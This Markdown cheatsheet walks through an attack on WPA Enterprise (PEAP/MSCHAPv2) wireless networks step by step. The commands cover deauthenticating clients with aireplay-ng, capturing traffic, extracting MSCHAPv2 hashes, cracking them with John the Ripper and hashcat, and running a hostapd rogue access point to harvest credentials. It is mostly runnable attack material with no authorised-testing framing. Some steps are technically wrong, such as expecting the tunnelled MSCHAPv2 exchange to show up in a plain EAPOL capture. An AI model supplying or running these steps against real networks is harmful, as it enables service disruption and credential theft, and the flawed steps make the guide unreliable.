# WPA Enterprise Attack Cheatsheet

## Attack Flow

1. **Scan & Identify**  
    Find WPA Enterprise (802.1X/PEAP) networks.

2. **Capture EAPOL Handshake**  
    Record PEAP tunnel and MSCHAPv2 challenge/response.

3. **Extract MSCHAPv2 Hash**  
    Parse handshake for challenge/response pairs.

4. **Offline Crack**  
    Recover user password from hashes.

5. **(Optional) Rogue AP**  
    Deploy fake AP to capture credentials.

---

## Step-by-Step Commands

### 1. Scan & Capture

```bash
sudo airmon-ng start wlan0
sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
```
- Use `airodump-ng` to capture EAPOL handshake.

**Force handshake:**
```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

### 2. Analyze PEAP Exchange

Open capture in Wireshark:
```bash
wireshark capture-01.cap
```
- Filter: `eapol`  
- Inspect for MSCHAPv2 exchange.

### 3. Extract MSCHAPv2 Hash

```bash
chapcrack.py capture-01.cap > hash.txt
```
- Use `chapcrack.py` or similar tools.

### 4. Offline Password Cracking

**John the Ripper:**
```bash
john --format=netntlm hash.txt
```

**Hashcat:**
```bash
hashcat -m 5500 hash.txt wordlist.txt
```

### 5. Rogue AP Setup (Optional)

Sample `hostapd.conf` for WPA-Enterprise PEAP:

```ini
interface=wlan0mon
driver=nl80211
ssid=FakeEnterpriseAP
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
auth_algs=3
eap_server=1
eap_user_file=/etc/hostapd.eap_user
ca_cert=/path/to/ca.pem
server_cert=/path/to/server.pem
private_key=/path/to/server.key
```

Start fake AP:
```bash
sudo hostapd hostapd.conf
```
- Monitor logs for credentials.

---

## Useful Tools

- **airmon-ng, airodump-ng, aireplay-ng:** Monitoring & capture
- **wireshark:** Packet analysis
- **chapcrack.py:** Extract MSCHAPv2 challenge/response
- **john, hashcat:** Offline password cracking
- **hostapd:** Rogue AP setup
- **freeradius-wpe:** Rogue RADIUS credential capture

